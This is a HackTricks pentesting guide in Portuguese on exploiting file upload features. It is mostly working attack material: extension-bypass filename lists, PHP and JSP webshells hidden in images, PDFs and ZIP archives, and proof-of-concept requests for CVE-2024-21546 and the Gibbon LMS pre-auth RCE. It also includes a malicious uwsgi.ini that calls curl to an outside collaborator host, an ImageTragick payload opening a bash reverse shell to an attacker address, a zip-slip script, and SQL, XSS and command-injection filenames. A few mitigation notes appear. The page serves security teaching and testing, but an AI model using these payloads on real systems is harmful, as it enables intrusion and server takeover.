# Upload de Arquivos

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Geral de Upload de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass das verificações de extensões de arquivo

1. Se se aplicarem, **verifique** as **extensões anteriores.** Teste-as também usando algumas **letras maiúsculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionar uma extensão válida antes** da extensão de execução (use também as extensões anteriores):_
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar o Burp para **bruteforce** todos os caracteres **ascii** e **Unicode**. (_Observe que você também pode tentar usar as **extensões** mencionadas **anteriormente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções **enganando o parser de extensões** do lado do servidor com técnicas como **duplicar** a **extensão** ou **adicionar dados lixo** (bytes **null**) entre as extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** ao teste anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão de execução antes da extensão válida** e torça para que o servidor esteja mal configurado. (útil para explorar misconfigurações do Apache onde qualquer coisa com extensão **.php**, mas não necessariamente terminando em .php, executará código):
- _ex: file.php.png_
7. Uso do **NTFS alternate data stream (ADS)** no **Windows**. Neste caso, um caractere dois-pontos ":" será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (ex.: "file.asax:.jpg”). Esse arquivo pode ser editado depois usando outras técnicas, como usar seu nome curto. O padrão "**::$data**” também pode ser usado para criar arquivos não vazios. Portanto, adicionar um ponto após esse padrão pode ser útil para contornar restrições adicionais (ex.: "file.asp::$data.”)
8. Tente ultrapassar os limites de nome de arquivo. A extensão válida é cortada. E o PHP malicioso permanece. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alguns handlers de upload cortam ou normalizam caracteres de ponto finais do nome de arquivo salvo. No UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) em versões anteriores à 2.9.1, você pode contornar a validação de extensões mediante:

- Usar um MIME de imagem válido e header mágico (por exemplo, o PNG `\x89PNG\r\n\x1a\n`).
- Nomear o arquivo enviado com uma extensão PHP seguida por um ponto, ex.: `shell.php.`

O servidor remove o ponto final e persiste `shell.php`, que será executado se for colocado em um diretório servido pela web (armazenamento público padrão como `/storage/files/`).

PoC mínimo (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Então acesse o caminho salvo (típico em Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check adicionando no início do arquivo os **bytes de uma imagem real** (confunde o comando _file_). Ou introduza o shell dentro dos **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou você também pode **introduzir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressions is being added to your image**, por exemplo usando bibliotecas PHP padrão como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as técnicas anteriores não serão úteis. Entretanto, você pode usar o **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- A página web também pode estar **resizing** a **image**, usando por exemplo as funções PHP-GD `imagecopyresized` ou `imagecopyresampled`. No entanto, você pode usar o **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Outra técnica para criar um payload que **sobrevive a um redimensionamento de imagem**, usando a função PHP-GD `thumbnailImage`. Entretanto, você pode usar o **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir texto que **sobreviva à compressão**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Encontre uma vulnerabilidade para **rename** o arquivo já enviado (para mudar a extensão).
- Encontre uma vulnerabilidade de **Local File Inclusion** para executar o backdoor.
- **Possível disclosure de informação**:
1. Faça upload **várias vezes** (e ao **mesmo tempo**) do **mesmo arquivo** com o **mesmo nome**
2. Faça upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
3. Fazer upload de um arquivo com **"." , "..", or "…" como nome**. Por exemplo, no Apache no **Windows**, se a aplicação salvar os arquivos enviados em "/www/uploads/" diretório, o filename "." criará um arquivo chamado
uploads” em "/www/".
4. Fazer upload de um arquivo que pode não ser deletado facilmente como **"…:.jpg"** em **NTFS**. (Windows)
5. Fazer upload de um arquivo no **Windows** com **caracteres inválidos** como `|<>*?”` no nome. (Windows)
6. Fazer upload de um arquivo no **Windows** usando nomes reservados (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Tente também fazer upload de um executável (.exe) ou um **.html** (menos suspeito) que **executará código** quando aberto acidentalmente pela vítima.

### Special extension tricks

Se você está tentando enviar arquivos para um **PHP server**, [dê uma olhada no **.htaccess** trick para executar código](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se você está tentando enviar arquivos para um **ASP server**, [dê uma olhada no **.config** trick para executar código](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` são como os `.jar` para java, mas para php, e podem ser **usados como um arquivo php** (executando-o com php, ou incluindo-o dentro de um script...)

A extensão `.inc` às vezes é usada para arquivos php que são apenas usados para **importar arquivos**, então, em algum momento, alguém pode ter permitido **essa extensão ser executada**.

## **Jetty RCE**

Se você conseguir enviar um arquivo XML para um servidor Jetty você pode obter [RCE porque **novos *.xml and *.war são processados automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Então, como mencionado na imagem a seguir, envie o arquivo XML para `$JETTY_BASE/webapps/` e espere a shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Para uma exploração detalhada dessa vulnerabilidade confira a pesquisa original: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Remote Command Execution (RCE) podem ser exploradas em servidores uWSGI se alguém tiver a capacidade de modificar o arquivo de configuração `.ini`. Os arquivos de configuração do uWSGI utilizam uma sintaxe específica para incorporar variáveis "mágicas", placeholders e operadores. Notavelmente, o operador '@', utilizado como `@(filename)`, é projetado para incluir o conteúdo de um arquivo. Entre os vários schemes suportados no uWSGI, o scheme "exec" é particularmente potente, permitindo a leitura de dados a partir do stdout de um processo. Essa funcionalidade pode ser manipulada para fins maliciosos, como Remote Command Execution ou Arbitrary File Write/Read quando um arquivo de configuração `.ini` é processado.

Considere o seguinte exemplo de um arquivo `uwsgi.ini` malicioso, demonstrando vários schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante o parsing do arquivo de configuração. Para que a configuração seja ativada e parseada, o processo uWSGI deve ser reiniciado (potencialmente após um crash ou devido a um ataque de Denial of Service) ou o arquivo deve estar configurado para auto-reload. A feature auto-reload, se habilitada, recarrega o arquivo em intervalos especificados ao detectar alterações.

É crucial entender a natureza permissiva do parsing do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (como uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Um endpoint não autenticado no Gibbon LMS permite arbitrary file write dentro do web root, levando a pre-auth RCE ao enviar um arquivo PHP. Versões vulneráveis: até e incluindo 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Método: POST
- Parâmetros necessários:
- `img`: data-URI-like string: `[mime];[name],[base64]` (o servidor ignora type/name, e base64-decodes a parte final)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

PoC mínimo para escrever e ler um arquivo:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Implante um webshell mínimo e execute comandos:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- O handler executa `base64_decode($_POST["img"])` após separar por `;` e `,`, então escreve os bytes em `$absolutePath . '/' . $_POST['path']` sem validar extensão/tipo.
- O código resultante roda como o usuário do serviço web (por exemplo, XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Observe que **outra opção** que você pode estar pensando para contornar essa verificação é fazer com que o **servidor HTTP redirecione para um arquivo diferente**, assim a URL inicial vai passar pela verificação e então o wget irá baixar o arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names` porque **o wget baixará a página redirecionada com o nome do arquivo indicado na URL original**.

### Evasão do diretório de upload via NTFS junctions (Windows)

(Para esse ataque você precisará de acesso local à máquina Windows) Quando os uploads são armazenados em subpastas por usuário no Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) e você controla a criação/remoção dessa subpasta, você pode substituí-la por uma NTFS junction apontando para um local sensível (e.g., o webroot). Uploads subsequentes serão gravados no caminho de destino, permitindo execução de código se o alvo interpretar código server‑side.

Exemplo de fluxo para redirecionar uploads para o webroot do XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notas
- mklink /J creates an NTFS directory junction (reparse point). A conta do servidor web deve seguir a junction e ter permissão de escrita no destino.
- Isto redireciona gravações arbitrárias de arquivos; se o destino executar scripts (PHP/ASP), isso se torna RCE.
- Defesas: não permita que raízes de upload graváveis sejam controláveis por um atacante sob C:\Windows\Tasks ou similar; bloquear a criação de junctions; validar extensões no lado do servidor; armazenar uploads em um volume separado ou com deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Alguns upload/ingest handlers escrevem o body bruto da requisição em um caminho do sistema de arquivos que é construído a partir de parâmetros de query controlados pelo usuário. Se o handler também suporta Content-Encoding: gzip e falha em canonicalizar/validar o destination path, você pode combinar directory traversal com um payload gzipped para gravar bytes arbitrários em um diretório servido pela web e obter RCE (por exemplo, dropar um JSP sob o webapps do Tomcat).

Fluxo genérico de exploração:
- Prepare seu payload server-side (por exemplo, um JSP webshell minimal) e comprima os bytes com gzip.
- Envie um POST onde um parâmetro de caminho (por exemplo, token) contém path traversal escapando da pasta pretendida, e file indica o nome do arquivo a persistir. Defina Content-Type: application/octet-stream e Content-Encoding: gzip; o body é o payload comprimido.
- Acesse o arquivo escrito para disparar a execução.

Requisição ilustrativa:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Então acione:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notas
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- A extensão Hackvertor do Burp Suite pode produzir um corpo gzip correto a partir do seu payload.
- Este é um padrão puramente pre-auth arbitrary file write → RCE; ele não depende de multipart parsing.

Mitigações
- Determine os destinos de upload no lado do servidor; nunca confie em fragmentos de caminho vindos dos clientes.
- Canonicalize e garanta que o caminho resolvido permaneça dentro de um diretório base allow-listed.
- Armazene uploads em um volume não-executável e negue execução de scripts a partir de caminhos graváveis.

## Ferramentas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) é uma ferramenta poderosa projetada para ajudar Pentesters e Bug Hunters a testar mecanismos de file upload. Ela aproveita várias técnicas de bug bounty para simplificar o processo de identificação e exploração de vulnerabilidades, garantindo avaliações completas de aplicações web.

### Corrompendo upload indices com snprintf quirks (historical)

Alguns handlers de upload legados que usam `snprintf()` ou similar para construir arrays multi-file a partir de um upload single-file podem ser enganados a forjar a estrutura `_FILES`. Devido a inconsistências e truncamento no comportamento de `snprintf()`, um upload cuidadosamente criado pode aparecer como múltiplos arquivos indexados no lado do servidor, confundindo lógica que assume uma forma estrita (por exemplo, tratando como um upload multi-file e seguindo ramos inseguros). Embora hoje em dia seja nicho, esse padrão de “index corruption” ocasionalmente reaparece em CTFs e codebases mais antigas.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- PDFs especialmente criados para XSS: a [página a seguir mostra como **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Se você puder fazer upload de PDFs, pode preparar um PDF que execute JS arbitrário seguindo as indicações dadas.
- Faça upload do conteúdo de \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar se o servidor possui algum **antivirus**
- Verifique se existe algum **size limit** ao fazer upload de arquivos

Aqui está uma lista top 10 de coisas que você pode conseguir enviando arquivos (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes Mágicos de Cabeçalho

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) para outros tipos de arquivo.

## Zip/Tar File Automatically decompressed Upload

Se você puder fazer upload de um ZIP que será descomprimido dentro do servidor, você pode fazer 2 coisas:

### Symlink

Faça upload de um arquivo contendo soft links para outros arquivos; ao acessar os arquivos descomprimidos você acessará os arquivos linkados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompactar em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompressão é um problema significativo. Apesar das suposições iniciais de que essa configuração poderia impedir OS-level command execution por meio de malicious file uploads, o suporte a compressão hierárquica e as capacidades de directory traversal do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes bypass restrictions e escapem dos secure upload directories ao manipular a funcionalidade de descompressão da aplicação alvo.

Um exploit automatizado para criar tais arquivos está disponível em [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). A ferramenta pode ser usada como mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, a **symlink trick with evilarc** é uma opção. Se o objetivo for direcionar um arquivo como `/flag.txt`, deve ser criado um symlink para esse arquivo no seu sistema. Isso assegura que evilarc não encontre erros durante sua operação.

Abaixo está um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Para mais detalhes **veja a postagem original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Criando um PHP Shell**: Código PHP é escrito para executar comandos passados através da variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Vários arquivos são criados e um zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modificação com um Hex Editor ou vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um editor hex, trocando "xxA" por "../" para percorrer diretórios.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Quando um backend valida entradas ZIP usando o ZipArchive do PHP, mas a extração grava no filesystem usando nomes raw, você pode contrabandear uma extensão não permitida inserindo um NUL (0x00) nos campos de filename. ZipArchive trata o nome da entrada como uma C‑string e trunca no primeiro NUL; o filesystem grava o nome completo, cortando tudo após o NUL.

High-level flow:
- Prepare um arquivo container legítimo (por ex., um PDF válido) que incorpore um pequeno PHP stub em um stream para que o magic/MIME permaneça um PDF.
- Nomeie-o como `shell.php..pdf`, zip it, então hex‑edite o ZIP local header e o central directory filename para substituir o primeiro `.` após `.php` por `0x00`, resultando em `shell.php\x00.pdf`.
- Validadores que dependem do ZipArchive irão “ver” `shell.php .pdf` e permitir; o extractor grava `shell.php` no disco, levando a RCE se a pasta de upload for executável.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Notas
- Altere AMBAS as ocorrências do filename (local e central directory). Algumas ferramentas adicionam também uma entrada extra de data descriptor — ajuste todos os campos name se presentes.
- O arquivo payload ainda precisa passar pela verificação server‑side de magic/MIME. Incorporar o PHP em um PDF stream mantém o cabeçalho válido.
- Funciona quando o enum/validation path e o extraction/write path discordam no tratamento de strings.

### ZIPs empilhados/concatenados (desacordo do parser)

Concatenar dois arquivos ZIP válidos produz um blob onde diferentes parsers focam em diferentes registros EOCD. Muitas ferramentas localizam o último End Of Central Directory (EOCD), enquanto algumas bibliotecas (por exemplo, ZipArchive em fluxos de trabalho específicos) podem analisar o primeiro arquivo que encontrarem. Se a validação enumerar o primeiro arquivo e a extração usar outra ferramenta que respeite o último EOCD, um arquivo benigno pode passar nas verificações enquanto um malicioso é extraído.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Padrão de abuso
- Crie um arquivo benigno (tipo permitido, por exemplo, um PDF) e um segundo arquivo contendo uma extensão bloqueada (por exemplo, `shell.php`).
- Concatene-os: `cat benign.zip evil.zip > combined.zip`.
- Se o servidor valida com um parser (vê `benign.zip`) mas extrai com outro (processa `evil.zip`), o arquivo bloqueado acaba no caminho de extração.

## ImageTragic

Faça upload deste conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (a partir do [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando PHP Shell em PNG

Incorporar um PHP Shell no chunk IDAT de um arquivo PNG pode efetivamente contornar certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes neste contexto, pois são comumente usadas para redimensionar e reamostrar imagens, respectivamente. A capacidade do PHP Shell embutido de permanecer inalterado por essas operações é uma vantagem significativa para certos casos de uso.

